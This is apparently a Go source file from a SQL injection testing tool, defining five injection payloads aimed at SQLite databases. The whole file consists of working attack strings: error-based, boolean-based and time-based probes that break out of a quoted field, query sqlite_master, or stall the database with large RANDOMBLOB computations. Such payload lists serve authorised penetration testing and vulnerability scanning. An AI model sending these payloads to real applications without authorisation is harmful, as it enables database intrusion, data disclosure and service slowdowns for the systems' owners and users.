package payloads

var SQLite = PayloadGroup{
	DBMS: "SQLite",
	Payloads: []Payload{
		{Type: "error", Content: "' AND 1=sqlite_version()--"},
		{Type: "boolean", Content: "' AND (SELECT 1)=1--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))))--"},
		{Type: "error", Content: "' AND (SELECT UPPER(HEX(RANDOMBLOB(100000000/2))))--"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"},
	},
}
